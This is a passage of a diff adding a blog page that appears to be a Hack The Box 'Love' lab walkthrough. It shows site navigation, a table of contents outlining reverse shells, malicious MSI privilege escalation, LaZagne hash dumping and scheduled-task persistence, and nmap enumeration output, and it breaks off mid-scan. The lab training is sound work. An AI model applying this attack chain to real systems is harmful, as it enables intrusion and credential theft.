@@ -1,0 +1,2389 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.140.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Love HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Love HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/editorial-box/" title="./walkthroughs/editorial-box/">
+                        
+                            Editorial HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
+                        
+                            Doctor HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
+                        
+                            Forest HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
+                        
+                            Understanding AS-REP Roasting Attacks: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/love-box/" title="./love-box/">
+                        
+                            Love HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Love HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.24.12"
+                            >2024.24.12
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        17 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/activedirectory/"
+                            class="tag-btn">
+                            ActiveDirectory
+                        </a>
+                    
+                        <a
+                            href="/tags/ssrf/"
+                            class="tag-btn">
+                            SSRF
+                        </a>
+                    
+                        <a
+                            href="/tags/scheduledtask/"
+                            class="tag-btn">
+                            ScheduledTask
+                        </a>
+                    
+                        <a
+                            href="/tags/msi/"
+                            class="tag-btn">
+                            msi
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/love-box/" class="bread-btn">
+    
+
+    
+        
+            Love HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#love-hack-the-box-walkthrough-writeup">Love Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#service-5000">Service <code>5000</code>:</a></li>
+        <li><a href="#service-7680">Service <code>7680</code>:</a></li>
+        <li><a href="#web-80-443">Web <code>80/443</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#getting-rce-on-the-host-and-a-reverse-shell">Getting RCE on the host &amp; a reverse shell:</a></li>
+        <li><a href="#enumerating-the-host-as-phoebe">Enumerating the host as phoebe:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#privesc-method-1-creating-a-malicious-msi-reverse-shell-with-msfvenom">Privesc Method 1: Creating a malicious msi reverse shell with msfvenom:</a></li>
+        <li><a href="#privesc-method-2-adding-a-new-admin-user-with-msfvenom">Privesc Method 2: Adding a new Admin User with msfvenom:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-persistence">4. Persistence:</a>
+      <ul>
+        <li><a href="#dumping-admin-hash-with-lazagne-dot-exe">Dumping Admin Hash with LaZagne.exe:</a></li>
+        <li><a href="#adding-a-scheduled-task-to-call-back-out-to-us">Adding a Scheduled Task To Call Back Out to us:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="love-hack-the-box-walkthrough-writeup">Love Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Love">https://app.hackthebox.com/machines/Love</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>🕙 06:05:33 zsh ❯ nmap $box -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-23 06:05 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.48.103
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.043s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">993</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>443/tcp  open  https
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql
+</span></span><span style="display:flex;"><span>5000/tcp open  upnp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.09 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>HTTP/HTTPs</li>
+<li>SMB</li>
+<li>MYSQL</li>
+<li>Interestingly a service on 5000</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li><strong>In depth scan TCP</strong>:
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20ali%20in%20HTB/BlogEntriesMade/Love/scans/nmap%20%20%f0%9f%8d%a3%20main%20%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2006:05:37%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20[sudo]%20password%20for%20kali:%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-12-23%2006:06%20GMT%0a%20%20Nmap%20scan%20report%20for%2010.129.48.103%0a%20%20Host%20is%20up%20%280.036s%20latency%29.%0a%20%20Not%20shown:%2065516%20closed%20tcp%20ports%20%28reset%29%0a%20%20PORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20VERSION%0a%20%2080/tcp%20%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20Apache%20httpd%202.4.46%20%28%28Win64%29%20OpenSSL/1.1.1j%20PHP/7.3.27%29%0a%20%20%7c_http-server-header:%20Apache/2.4.46%20%28Win64%29%20OpenSSL/1.1.1j%20PHP/7.3.27%0a%20%20%7c_http-title:%20Voting%20System%20using%20PHP%0a%20%20%7c%20http-cookie-flags:%0a%20%20%7c%20%20%20/:%0a%20%20%7c%20%20%20%20%20PHPSESSID:%0a%20%20%7c_%20%20%20%20%20%20httponly%20flag%20not%20set%0a%20%20135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20139/tcp%20%20%20open%20%20netbios-ssn%20%20Microsoft%20Windows%20netbios-ssn%0a%20%20443/tcp%20%20%20open%20%20ssl/http%20%20%20%20%20Apache%20httpd%202.4.46%20%28OpenSSL/1.1.1j%20PHP/7.3.27%29%0a%20%20%7c_ssl-date:%20TLS%20randomness%20does%20not%20represent%20time%0a%20%20%7c_http-server-header:%20Apache/2.4.46%20%28Win64%29%20OpenSSL/1.1.1j%20PHP/7.3.27%0a%20%20%7c%20tls-alpn:%0a%20%20%7c_%20%20http/1.1%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in%0a%20%20%7c%20Not%20valid%20before:%202021-01-18T14:00:16%0a%20%20%7c_Not%20valid%20after:%20%202022-01-18T14:00:16%0a%20%20%7c_http-title:%20403%20Forbidden%0a%20%20445/tcp%20%20%20open%20%20microsoft-ds%20Windows%2010%20Pro%2019042%20microsoft-ds%20%28workgroup:%20WORKGROUP%29%0a%20%203306/tcp%20%20open%20%20mysql?%0a%20%20%7c%20fingerprint-strings:%0a%20%20%7c%20%20%20JavaRMI,%20Kerberos,%20LANDesk-RC,%20NotesRPC,%20RPCCheck,%20SSLSessionReq,%20TerminalServer,%20TerminalServerCookie,%20X11Probe,%20ms-sql-s:%0a%20%20%7c_%20%20%20%20Host%20%2710.10.14.80%27%20is%20not%20allowed%20to%20connect%20to%20this%20MariaDB%20server%0a%20%205000/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20Apache%20httpd%202.4.46%20%28OpenSSL/1.1.1j%20PHP/7.3.27%29%0a%20%20%7c_http-title:%20403%20Forbidden%0a%20%20%7c_http-server-header:%20Apache/2.4.46%20%28Win64%29%20OpenSSL/1.1.1j%20PHP/7.3.27%0a%20%205040/tcp%20%20open%20%20unknown%0a%20%205985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-title:%20Not%20Found%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%205986/tcp%20%20open%20%20ssl/http%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-title:%20Not%20Found%0a%20%20%7c_ssl-date:%202024-12-23T07:32:38&#43;00:00;%20&#43;1h21m34s%20from%20scanner%20time.%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=LOVE%0a%20%20%7c%20Subject%20Alternative%20Name:%20DNS:LOVE,%20DNS:Love%0a%20%20%7c%20Not%20valid%20before:%202021-04-11T14:39:19%0a%20%20%7c_Not%20valid%20after:%20%202024-04-10T14:39:19%0a%20%20%7c%20tls-alpn:%0a%20%20%7c_%20%20http/1.1%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%207680/tcp%20%20open%20%20pando-pub?%0a%20%2047001/tcp%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%20%7c_http-title:%20Not%20Found%0a%20%2049664/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049665/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049666/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049668/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049669/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049670/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%201%20service%20unrecognized%20despite%20returning%20data.%20If%20you%20know%20the%20service/version,%20please%20submit%20the%20following%20fingerprint%20at%20https://nmap.org/cgi-bin/submit.cgi?new-service%20:%0a%20%20SF-Port3306-TCP:V=7.94SVN%25I=7%25D=12/23%25T